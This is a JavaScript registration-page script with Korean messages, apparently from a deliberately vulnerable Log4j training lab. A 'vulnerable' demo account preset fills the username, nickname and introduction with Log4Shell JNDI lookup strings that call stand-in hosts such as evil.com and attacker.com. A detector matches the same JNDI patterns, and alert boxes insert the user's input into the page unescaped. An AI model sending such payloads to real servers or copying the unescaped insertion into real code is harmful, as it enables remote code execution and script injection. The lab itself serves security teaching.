function performRegister(event) {
  event.preventDefault();

  const formData = {
    username: document.getElementById('username').value,
    email: document.getElementById('email').value,
    password: document.getElementById('password').value,
    nickname: document.getElementById('nickname').value,
    department: document.getElementById('department').value,
    introduction: document.getElementById('introduction').value,
  };

  if (!validateForm(formData)) return false;

  const submitButton = event.target.querySelector('button[type="submit"]');
  const originalText = submitButton.innerHTML;
  submitButton.innerHTML =
    '<i class="fas fa-spinner fa-spin me-2"></i>가입 처리 중...';
  submitButton.disabled = true;

  fetch('/api/users/register', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(formData),
  })
    .then((response) => {
      if (response.ok) return response.text();
      throw new Error('회원가입 실패');
    })
    .then(() => {
      showAlert(
        '회원가입이 완료되었습니다! 로그인 페이지로 이동합니다.',
        'success'
      );

      const sensitiveFields = [
        formData.username,
        formData.nickname,
        formData.introduction,
      ];
      sensitiveFields.forEach((field) => {
        if (field && detectJNDIPattern(field)) {
          showVulnerabilityAlert(field);
        }
      });

      setTimeout(() => {
        window.location.href = '/login?registered=true';
      }, 2000);
    })
    .catch((error) => {
      console.error('회원가입 오류:', error);
      showAlert(
        '회원가입 중 오류가 발생했습니다. 다시 시도해주세요.',
        'danger'
      );
    })
    .finally(() => {
      submitButton.innerHTML = originalText;
      submitButton.disabled = false;
    });

  return false;
}

function validateForm(data) {
  let isValid = true;

  if (data.username.length < 3) {
    setFieldValidation(
      'username',
      false,
      '사용자명은 3자리 이상이어야 합니다.'
    );
    isValid = false;
  } else {
    setFieldValidation('username', true, '사용 가능한 사용자명입니다.');
  }

  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if (!emailRegex.test(data.email)) {
    setFieldValidation('email', false, '올바른 이메일 형식이 아닙니다.');
    isValid = false;
  } else {
    setFieldValidation('email', true, '올바른 이메일 형식입니다.');
  }

  const confirmPassword = document.getElementById('confirmPassword').value;
  if (data.password !== confirmPassword) {
    setFieldValidation(
      'confirmPassword',
      false,
      '비밀번호가 일치하지 않습니다.'
    );
    isValid = false;
  } else {
    setFieldValidation('confirmPassword', true, '비밀번호가 일치합니다.');
  }

  if (!document.getElementById('agreeTerms').checked) {
    showAlert('이용약관에 동의해주세요.', 'warning');
    isValid = false;
  }

  return isValid;
}

function setFieldValidation(fieldId, isValid, message) {
  const field = document.getElementById(fieldId);
  const feedback = document.getElementById(fieldId + 'Validation');

  field.classList.remove('is-valid', 'is-invalid');
  field.classList.add(isValid ? 'is-valid' : 'is-invalid');

  if (feedback) {
    feedback.textContent = message;
    feedback.className = `validation-feedback ${
      isValid ? 'text-success' : 'text-danger'
    }`;
  }
}

function checkPasswordStrength(password) {
  const indicator = document.getElementById('passwordStrength');
  let strength = 0;
  if (password.length >= 6) strength++;
  if (/[a-z]/.test(password)) strength++;
  if (/[A-Z]/.test(password)) strength++;
  if (/[0-9]/.test(password)) strength++;
  if (/[^a-zA-Z0-9]/.test(password)) strength++;

  indicator.classList.remove(
    'strength-weak',
    'strength-medium',
    'strength-strong'
  );
  if (strength <= 2) indicator.classList.add('strength-weak');
  else if (strength <= 4) indicator.classList.add('strength-medium');
  else indicator.classList.add('strength-strong');
}

function detectJNDIPattern(input) {
  const patterns = [/\$\{jndi:/i, /ldap:\/\//i, /rmi:\/\//i, /dns:\/\//i];
  return patterns.some((p) => p.test(input));
}

function showVulnerabilityAlert(input) {
  const html = `
    <div class="alert alert-warning alert-dismissible fade show mt-3" role="alert">
      <h6 class="fw-bold"><i class="fas fa-bug me-2"></i>Log4j 취약점 패턴 감지!</h6>
      <p class="mb-1">입력된 정보에서 JNDI 패턴이 발견되었습니다.</p>
      <small>패턴: <code>${input.substring(0, 50)}${
    input.length > 50 ? '...' : ''
  }</code></small>
      <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
    </div>`;
  document
    .querySelector('.register-body')
    .insertAdjacentHTML('beforeend', html);
}

function fillDemoAccount(type) {
  const accounts = {
    user: {
      username: 'newuser',
      email: 'newuser@securelogistics.com',
      password: 'password123',
      nickname: '신규사용자',
      department: '물류팀',
      introduction: '새로 입사한 물류팀 직원입니다.',
    },
    manager: {
      username: 'newmanager',
      email: 'manager@securelogistics.com',
      password: 'manager123',
      nickname: '신규매니저',
      department: '관리팀',
      introduction: '팀을 이끌어갈 신규 매니저입니다.',
    },
    vulnerable: {
      username: '${jndi:ldap://evil.com/user}',
      email: 'test@example.com',
      password: 'test123',
      nickname: '${jndi:rmi://malicious.com/nick}',
      department: '기타',
      introduction:
        'Log4j 취약점 테스트를 위한 계정입니다. ${jndi:dns://attacker.com/data}',
    },
  };

  const account = accounts[type];
  if (account) {
    Object.keys(account).forEach((key) => {
      const el = document.getElementById(key);
      if (el) {
        el.value = account[key];
        if (key === 'password') checkPasswordStrength(account[key]);
      }
    });

    if (type === 'vulnerable') {
      showAlert(
        '⚠️ 취약점 테스트 데이터가 입력되었습니다. 회원가입을 진행하면 JNDI 패턴이 로깅됩니다.',
        'warning'
      );
    }
  }
}

function showAlert(message, type = 'info') {
  const alertClass =
    {
      success: 'alert-success',
      danger: 'alert-danger',
      warning: 'alert-warning',
      info: 'alert-info',
    }[type] || 'alert-info';

  const html = `
    <div class="alert ${alertClass} alert-dismissible fade show" role="alert">
      ${message}
      <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
    </div>`;
  document.querySelectorAll('.alert').forEach((a) => a.remove());
  document
    .querySelector('.register-body')
    .insertAdjacentHTML('afterbegin', html);
}

document.addEventListener('DOMContentLoaded', () => {
  const usernameEl = document.getElementById('username');
  usernameEl.addEventListener('input', (e) => {
    const val = e.target.value;
    if (detectJNDIPattern(val)) {
      e.target.style.borderColor = '#ffc107';
      e.target.style.backgroundColor = '#fff3cd';
    } else {
      e.target.style.borderColor = '';
      e.target.style.backgroundColor = '';
    }
  });

  document.getElementById('password').addEventListener('input', (e) => {
    checkPasswordStrength(e.target.value);
  });

  document.getElementById('confirmPassword').addEventListener('input', (e) => {
    const pwd = document.getElementById('password').value;
    const confirm = e.target.value;
    if (pwd && confirm) {
      if (pwd === confirm) {
        setFieldValidation('confirmPassword', true, '비밀번호가 일치합니다.');
      } else {
        setFieldValidation(
          'confirmPassword',
          false,
          '비밀번호가 일치하지 않습니다.'
        );
      }
    }
  });

  usernameEl.focus();
});
